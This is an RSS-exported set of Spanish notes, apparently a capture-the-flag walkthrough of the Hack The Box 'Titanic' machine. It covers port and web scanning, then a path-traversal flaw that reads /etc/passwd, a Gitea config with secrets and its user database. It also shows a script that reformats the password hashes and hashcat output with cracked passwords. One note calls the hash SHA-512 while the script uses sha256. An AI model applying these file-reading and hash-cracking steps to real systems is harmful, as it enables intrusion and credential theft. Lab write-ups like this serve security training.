<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[HTB]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>HTB</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Mon, 17 Feb 2025 20:21:08 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Mon, 17 Feb 2025 20:21:05 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[1.Recon]]></title><description><![CDATA[ 
 <br><br><br>Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 70.18 seconds
           Raw packets sent: 70069 (3.083MB) | Rcvd: 65972 (2.639MB)

<br><br>PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-favicon: Unknown favicon MD5: 79E1E0A79A613646F473CFEDA9E231F1
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Titanic - Book Your Ship Trip
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/3.0.3 Python/3.10.12
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

<br><br><br>➜  ~ feroxbuster --url http://titanic.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -t 200
                                                                                                                     
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://titanic.htb
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c http://titanic.htb/book
200      GET       30l       77w      567c http://titanic.htb/static/styles.css
200      GET     2986l     7000w   469100c http://titanic.htb/static/assets/images/favicon.ico
200      GET      664l     5682w   412611c http://titanic.htb/static/assets/images/home.jpg
200      GET      859l     5115w   510909c http://titanic.htb/static/assets/images/luxury-cabins.jpg
200      GET      890l     5324w   534018c http://titanic.htb/static/assets/images/entertainment.jpg
200      GET      851l     5313w   507854c http://titanic.htb/static/assets/images/exquisite-dining.jpg
200      GET      156l      415w     7399c http://titanic.htb/

<br>Un whatweb nos indica que estamos trabajando contra un Servidor web Python, Wekzeug;<br>➜  ~ whatweb http://titanic.htb 
http://titanic.htb [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.10.12], IP[10.10.11.55], JQuery, Python[3.10.12], Script, Title[Titanic - Book Your Ship Trip], Werkzeug[3.0.3]
<br>Parece una pagina tipo "booking" para entradas al Titanic, esta cachonda;<br><img alt="Pasted image 20250217165949.png" src="machines/titanic/imgs/pasted-image-20250217165949.png"><br>
Ninguno de los botones de la pagina funcionan excepto el de Book Now;<br>
<img alt="Pasted image 20250217170046.png" src="machines/titanic/imgs/pasted-image-20250217170046.png"><br>Si le damos a submit nos decarga el formulario en formato json;<br>
El nombre del archivo es el siguiente 4852d90d-7587-420d-91e7-b4f84f2c539c.json parece que se genera un archivo de nombre aleatorio con el contenido rellenado del formulario;<br> {"name": "cher0", "email": "none@mail.com", "phone": "12345678", "date": "0002-02-02", "cabin": "Standard"}
<br>capturamos la peticion que enviamos al servidor cuando clickeamos submit<br>
<img alt="Pasted image 20250217170358.png" src="machines/titanic/imgs/pasted-image-20250217170358.png"><br>Nos redirige a la url http://titanic.htb/download?ticket=65449497-ae16-43b2-99f3-09656003ff09.json<br><br>Probamos a cambiar el nombre del archivo y nos da un not found; pero podemos leer archivos del sistema poniendo una ruta; realmente arcaico típico de la época del titanic.<br>
<img alt="Pasted image 20250217170935.png" src="machines/titanic/imgs/pasted-image-20250217170935.png"><br>
LFI:<br>http://titanic.htb/download?ticket=/etc/passwd
<br>Nos descarga el siguiente archivo:  _etc_passwd<br><br>➜  nmap cat --plain ~/Descargas/_etc_passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

<br>Usuarios del sistema:<br>root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
<br><br>Sacamos el /etc/hosts del sistema mediante el LFI;<br>http://titanic.htb/download?ticket=/etc/hosts
<br>descubrimos el subdominio dev.titanic.htb; podriamos haberlo sacado por fuzzing facilmente<br>127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
<br><br>Lo anadimos a nuestro /etc/hosts:<br>10.10.11.55 titanic.htb dev.titanic.htb
<br>➜  ~ nikto --url http://dev.titanic.htb
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.55
+ Target Hostname:    dev.titanic.htb
+ Target Port:        80
+ Start Time:         2025-02-17 18:09:06 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.52 (Ubuntu)
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /v2/_catalog: Uncommon header 'docker-distribution-api-version' found, with contents: registry/2.0.
+ OPTIONS: Allowed HTTP Methods: ARRAY(0x55cdda20bb60) .
+ ERROR: Error limit (20) reached for host, giving up. Last error: 
+ Scan terminated: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-02-17 18:14:57 (GMT1) (351 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
<br><br>Nos encontramos con un Gitea:<br>
<img alt="Pasted image 20250217171840.png" src="machines/titanic/imgs/pasted-image-20250217171840.png"><br>➜  ~ whatweb http://dev.titanic.htb
http://dev.titanic.htb [200 OK] Apache[2.4.52], Cookies[_csrf,i_like_gitea], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[_csrf,i_like_gitea], IP[10.10.11.55], Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script, Title[Gitea: Git with a cup of tea], X-Frame-Options[SAMEORIGIN]
<br>encuentro la versión de gitea; la 1.22.1 mirando el source code; desgraciadamente no encuentro un exploit o alguna vulnerabilidad en esta versión; hay un XSS para la 1.22 que en esta versión esta parcheada; Vuln: <a rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/52077" target="_blank">https://www.exploit-db.com/exploits/52077</a><br>Nos registramos en Gitea y entramos en explore; http://dev.titanic.htb/explore/repos<br>
<img alt="Pasted image 20250217183141.png" src="machines/titanic/imgs/pasted-image-20250217183141.png"><br>
encontramos un par de repositorios de developer; les echamos un ojo<br><br><br><img alt="Pasted image 20250217183246.png" src="machines/titanic/imgs/pasted-image-20250217183246.png"><br>
Docker compose para la base de datos y su password;<br>version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
<br>Vemos que la base de datos esta corriendo en el puerto 3306 pero no tenemos acceso de momento;<br><br>version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
<br>Bueno tenemos ruta en local; el /data de gitea esta en /home/developer/gitea/data<br><br>Flask-app es el repositorio para la pagina web del booking de titanic<br>
<img alt="Pasted image 20250217183543.png" src="machines/titanic/imgs/pasted-image-20250217183543.png"><br><br>from flask import Flask, request, jsonify, send_file, render_template, redirect, url_for, Response
import os
import json
from uuid import uuid4

app = Flask(__name__)

TICKETS_DIR = "tickets"

if not os.path.exists(TICKETS_DIR):
    os.makedirs(TICKETS_DIR)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/book', methods=['POST'])
def book_ticket():
    data = {
        "name": request.form['name'],
        "email": request.form['email'],
        "phone": request.form['phone'],
        "date": request.form['date'],
        "cabin": request.form['cabin']
    }

    ticket_id = str(uuid4())
    json_filename = f"{ticket_id}.json"
    json_filepath = os.path.join(TICKETS_DIR, json_filename)

    with open(json_filepath, 'w') as json_file:
        json.dump(data, json_file)

    return redirect(url_for('download_ticket', ticket=json_filename))

@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
<br><br>A partir del Docker-compose de gitea creo uno en local para observar la estructura de archivos<br>─# docker exec -it f4a35e1a9c34 bash
f4a35e1a9c34:/# cd /data/
f4a35e1a9c34:/data# ls
git    gitea  ssh
f4a35e1a9c34:/data# tree .
.
├── git
├── gitea
│   ├── conf
│   │   └── app.ini
│   └── log
└── ssh
    ├── ssh_host_ecdsa_key
    ├── ssh_host_ecdsa_key.pub
    ├── ssh_host_ed25519_key
    ├── ssh_host_ed25519_key.pub
    ├── ssh_host_rsa_key
    └── ssh_host_rsa_key.pub

5 directories, 7 files
f4a35e1a9c34:/data# 

<br>Si el docker-compose esta corriendo en la maquina podriamos ser capaces de sacar archivos del gitea; probamos a sacar el app.ini en la ruta : /home/developer/gitea/data/gitea/conf/app.ini<br>Usamos el lfi <br>http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini
<br>APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g

<br>Tenemos la ubicacion de la base de datos! <br>[database]
PATH = /data/gitea/gitea.db
<br>Usamos el lfi<br>http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db
<br>sqlite3 gitea.db 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite&gt; .tables
access                     oauth2_grant             
access_token               org_user                 
action                     package                  
action_artifact            package_blob             
action_run                 package_blob_upload      
action_run_index           package_cleanup_rule     
action_run_job             package_file             
action_runner              package_property         
action_runner_token        package_version          
action_schedule            project                  
action_schedule_spec       project_board            
action_task                project_issue            
action_task_output         protected_branch         
action_task_step           protected_tag            
action_tasks_version       public_key               
action_variable            pull_auto_merge          
app_state                  pull_request             
attachment                 push_mirror              
auth_token                 reaction                 
badge                      release                  
branch                     renamed_branch           
collaboration              repo_archiver            
comment                    repo_indexer_status      
commit_status              repo_redirect            
commit_status_index        repo_topic               
commit_status_summary      repo_transfer            
dbfs_data                  repo_unit                
dbfs_meta                  repository               
deploy_key                 review                   
email_address              review_state             
email_hash                 secret                   
external_login_user        session                  
follow                     star                     
gpg_key                    stopwatch                
gpg_key_import             system_setting           
hook_task                  task                     
issue                      team                     
issue_assignees            team_invite              
issue_content_history      team_repo                
issue_dependency           team_unit                
issue_index                team_user                
issue_label                topic                    
issue_user                 tracked_time             
issue_watch                two_factor               
label                      upload                   
language_stat              user                     
lfs_lock                   user_badge               
lfs_meta_object            user_blocking            
login_source               user_open_id             
milestone                  user_redirect            
mirror                     user_setting             
notice                     version                  
notification               watch                    
oauth2_application         webauthn_credential      
oauth2_authorization_code  webhook                  
sqlite&gt; 
<br>Sacamos la tabla user;<br>
<img alt="Pasted image 20250217184713.png" src="machines/titanic/imgs/pasted-image-20250217184713.png"><br>sqlite&gt; PRAGMA table_info(user);
0|id|INTEGER|1||1
1|lower_name|TEXT|1||0
2|name|TEXT|1||0
3|full_name|TEXT|0||0
4|email|TEXT|1||0
5|keep_email_private|INTEGER|0||0
6|email_notifications_preference|TEXT|1|'enabled'|0
7|passwd|TEXT|1||0
8|passwd_hash_algo|TEXT|1|'argon2'|0
9|must_change_password|INTEGER|1|0|0
10|login_type|INTEGER|0||0
11|login_source|INTEGER|1|0|0
12|login_name|TEXT|0||0
13|type|INTEGER|0||0
14|location|TEXT|0||0
15|website|TEXT|0||0
16|rands|TEXT|0||0
17|salt|TEXT|0||0
18|language|TEXT|0||0
19|description|TEXT|0||0
20|created_unix|INTEGER|0||0
21|updated_unix|INTEGER|0||0
22|last_login_unix|INTEGER|0||0
23|last_repo_visibility|INTEGER|0||0
24|max_repo_creation|INTEGER|1|-1|0
25|is_active|INTEGER|0||0
26|is_admin|INTEGER|0||0
27|is_restricted|INTEGER|1|0|0
28|allow_git_hook|INTEGER|0||0
29|allow_import_local|INTEGER|0||0
30|allow_create_organization|INTEGER|0|1|0
31|prohibit_login|INTEGER|1|0|0
32|avatar|TEXT|1||0
33|avatar_email|TEXT|1||0
34|use_custom_avatar|INTEGER|0||0
35|num_followers|INTEGER|0||0
36|num_following|INTEGER|1|0|0
37|num_stars|INTEGER|0||0
38|num_repos|INTEGER|0||0
39|num_teams|INTEGER|0||0
40|num_members|INTEGER|0||0
41|visibility|INTEGER|1|0|0
42|repo_admin_change_team_access|INTEGER|1|0|0
43|diff_view_style|TEXT|1|''|0
44|theme|TEXT|1|''|0
45|keep_activity_private|INTEGER|1|0|0
sqlite&gt; PRAGMA table_info(user);
0|id|INTEGER|1||1
1|lower_name|TEXT|1||0
2|name|TEXT|1||0
3|full_name|TEXT|0||0
4|email|TEXT|1||0
5|keep_email_private|INTEGER|0||0
6|email_notifications_preference|TEXT|1|'enabled'|0
7|passwd|TEXT|1||0
8|passwd_hash_algo|TEXT|1|'argon2'|0
9|must_change_password|INTEGER|1|0|0
10|login_type|INTEGER|0||0
11|login_source|INTEGER|1|0|0
12|login_name|TEXT|0||0
13|type|INTEGER|0||0
14|location|TEXT|0||0
15|website|TEXT|0||0
16|rands|TEXT|0||0
17|salt|TEXT|0||0
18|language|TEXT|0||0
19|description|TEXT|0||0
20|created_unix|INTEGER|0||0
21|updated_unix|INTEGER|0||0
22|last_login_unix|INTEGER|0||0
23|last_repo_visibility|INTEGER|0||0
24|max_repo_creation|INTEGER|1|-1|0
25|is_active|INTEGER|0||0
26|is_admin|INTEGER|0||0
27|is_restricted|INTEGER|1|0|0
28|allow_git_hook|INTEGER|0||0
29|allow_import_local|INTEGER|0||0
30|allow_create_organization|INTEGER|0|1|0
31|prohibit_login|INTEGER|1|0|0
32|avatar|TEXT|1||0
33|avatar_email|TEXT|1||0
34|use_custom_avatar|INTEGER|0||0
35|num_followers|INTEGER|0||0
36|num_following|INTEGER|1|0|0
37|num_stars|INTEGER|0||0
38|num_repos|INTEGER|0||0
39|num_teams|INTEGER|0||0
40|num_members|INTEGER|0||0
41|visibility|INTEGER|1|0|0
42|repo_admin_change_team_access|INTEGER|1|0|0
43|diff_view_style|TEXT|1|''|0
44|theme|TEXT|1|''|0
45|keep_activity_private|INTEGER|1|0|0
sqlite&gt; select * from user;
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1739811719|1739810910|1|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|4|0|0|0|0|unified|gitea-auto|0
3|test1|test1||test@xd.es|0|enabled|0e8d030d481c54a651a8cdb73c6fdb1b2900565ae1f7e95e9a943954fbf722565b76ed69fbae560a4bd55c1e75b9c5262900|pbkdf2$50000$50|0|0|0||0|||16220263a7a014a36bfc775908e2a1ac|fbbe897c5f7e2acc7e9662da1c6033f8|en-US||1739809739|1739814281|1739809739|0|-1|1|0|0|0|0|1|0|02ae5d68572414d3591b9fed657d41b2|test@xd.es|0|0|0|0|1|0|0|0|0|unified|gitea-auto|0
4|hahalol|hahalol||hahalol@gmail.com|0|enabled|f5cbd21458ebc24ae462926e851e21a953030e5f8bdc9f57633bb235b6944a08ae3e91036c8f7f13fd647edb942e3724b7b2|pbkdf2$50000$50|0|0|0||0|||4c43d3ea816ae4f8d0b095f993aad8bc|04c1e5c82ea5009599842f28ffa2b649|en-US||1739810105|1739812965|1739812965|0|-1|1|0|0|0|0|1|0|f1c8843f54a0e2794ea7538d408e0e91|hahalol@gmail.com|0|0|0|0|1|0|0|0|0||gitea-auto|0
5|hacker|hacker||hacker@gmail.com|0|enabled|2ce159ff197379b8598217f304fd62bf23553e51a12b30a50de4ecfc12add4214e88f2969edaa95be6b416eb659db8fb1f98|pbkdf2$50000$50|0|0|0||0|||5ca5776c7a616e8b19b67059de2d1b60|c7b686bac36b14f11712b6e027f73bb7|en-US||1739811981|1739812071|1739811981|0|-1|1|0|0|0|0|1|0|5f2e8c3605a2730d521d111a617aa968|hacker@gmail.com|0|0|0|0|1|0|0|0|0||gitea-auto|0
6|kali|kali||kali@kali.com|0|enabled|1cb922c696dee762c018ad606f8fd7eca87f9642809a3197c98eb661a5e74f1a4a49bed44ef9417d798b5cdb46064d0698bc|pbkdf2$50000$50|0|0|0||0|||be731a58906c441c4afe7e48bef44c7f|ccdee931405a2f5a1178661a185f64b6|en-US||1739812724|1739813242|1739812724|0|-1|1|0|0|0|0|1|0|951dc43cb482734c43d5f7f49dadcff0|kali@kali.com|0|0|0|0|1|0|0|0|0|unified|gitea-auto|0
7|tester|tester||tester@test.com|0|enabled|2a17317ce9211b8e4e44a75de69f017403528d30c0e6c0355ea9af7c350e19c6e1702a5cf90dc6652fc92cb2ac425231d79d|pbkdf2$50000$50|0|0|0||0|||6acd35897112b2862fb07ed947853558|ccf6419a6bc1132e547f5dd94057f124|en-US||1739813080|1739813081|1739813080|0|-1|1|0|0|0|0|1|0|0db53901eca1472a8997a38a24b38d06|tester@test.com|0|0|0|0|0|0|0|0|0||gitea-auto|0
8|cher0|cher0||none@mail.com|0|enabled|2f1bd1ee4c28629a3fdc8105c8fa3fa47972dc805531aa49b962b309ad7177e83b0506f22eb94873740565f1f434fd2d6d3b|pbkdf2$50000$50|0|0|0||0|||596dccd8ab821622a2a629dc7b5c2bc5|569a0839ffaa6c4a19489a5d1006cf12|en-US||1739813478|1739813900|1739813478|0|-1|1|0|0|0|0|1|0|12a1623f22ef4eec2da37b32549cb0ee|none@mail.com|0|0|0|0|0|0|0|0|0|unified|gitea-auto|0
sqlite&gt; 
<br><br><br>
<br>
Algoritmo de hashing :

<br>El campo passwd_hash_algo indica que el algoritmo utilizado es PBKDF2 .


<br>
Configuración del hash :

<br>Según el valor pbkdf2$50000$50:

<br>Iteraciones : 50,000.
<br>Longitud del hash : 50 bytes (en formato hexadecimal).
<br>Función hash subyacente : SHA-512 (implícito en PBKDF2).




<br>
Salt :

<br>El salt está almacenado en el campo salt. Por ejemplo:

<br>Para el usuario administrator: 70a5bd0c1a5d23caa49030172cdcabdc.
<br>Para el usuario developer: 0ce6f07fc9b557bc070fa7bef76a0d15.




<br>
Estructura del hash :

<br>El hash final (passwd) es el resultado de aplicar PBKDF2 sobre la contraseña original, utilizando el salt correspondiente y realizando 50,000 iteraciones. (esta jodida...)


<br>Script para sacar el hash de la base de datos;<br>sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
<br>administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
test1:sha256:50000:+76JfF9+Ksx+lmLaHGAz+A==:Do0DDUgcVKZRqM23PG/bGykAVlrh9+lempQ5VPv3IlZbdu1p+65WCkvVXB51ucUmKQA=
hahalol:sha256:50000:BMHlyC6lAJWZhC8o/6K2SQ==:9cvSFFjrwkrkYpJuhR4hqVMDDl+L3J9XYzuyNbaUSgiuPpEDbI9/E/1kftuULjckt7I=
hacker:sha256:50000:x7aGusNrFPEXErbgJ/c7tw==:LOFZ/xlzebhZghfzBP1ivyNVPlGhKzClDeTs/BKt1CFOiPKWntqpW+a0Futlnbj7H5g=
kali:sha256:50000:zN7pMUBaL1oReGYaGF9ktg==:HLkixpbe52LAGK1gb4/X7Kh/lkKAmjGXyY62YaXnTxpKSb7UTvlBfXmLXNtGBk0GmLw=
tester:sha256:50000:zPZBmmvBEy5Uf13ZQFfxJA==:KhcxfOkhG45ORKdd5p8BdANSjTDA5sA1XqmvfDUOGcbhcCpc+Q3GZS/JLLKsQlIx150=
cher0:sha256:50000:VpoIOf+qbEoZSJpdEAbPEg==:LxvR7kwoYpo/3IEFyPo/pHly3IBVMapJuWKzCa1xd+g7BQbyLrlIc3QFZfH0NP0tbTs=
<br>hashcat:<br>hashcat gitea.hashes rockyou.txt --user
<br><br>developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
test1:sha256:50000:+76JfF9+Ksx+lmLaHGAz+A==:Do0DDUgcVKZRqM23PG/bGykAVlrh9+lempQ5VPv3IlZbdu1p+65WCkvVXB51ucUmKQA=:123456789
hacker:sha256:50000:x7aGusNrFPEXErbgJ/c7tw==:LOFZ/xlzebhZghfzBP1ivyNVPlGhKzClDeTs/BKt1CFOiPKWntqpW+a0Futlnbj7H5g=:12345678
kali:sha256:50000:zN7pMUBaL1oReGYaGF9ktg==:HLkixpbe52LAGK1gb4/X7Kh/lkKAmjGXyY62YaXnTxpKSb7UTvlBfXmLXNtGBk0GmLw=:password
